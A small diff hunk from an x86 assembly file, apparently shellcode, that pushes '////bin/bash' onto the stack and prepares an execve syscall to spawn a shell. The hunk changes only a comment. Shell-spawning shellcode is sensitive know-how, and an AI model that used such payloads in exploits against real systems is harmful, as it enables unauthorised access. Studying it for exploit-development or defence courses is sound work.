@@ -85,7 +85,7 @@ _start:
     ; Spawn /bin/bash
     ; execve("/bin/bash", NULL, NULL)
     push edx		; Terminator = 0
-    mov al, 0x0b	; execve
+    mov al, 0x0b	; execve = 11
     push 0x68736162	; push ////bin/bash on stack
     push 0x2f6e6962
     push 0x2f2f2f2f
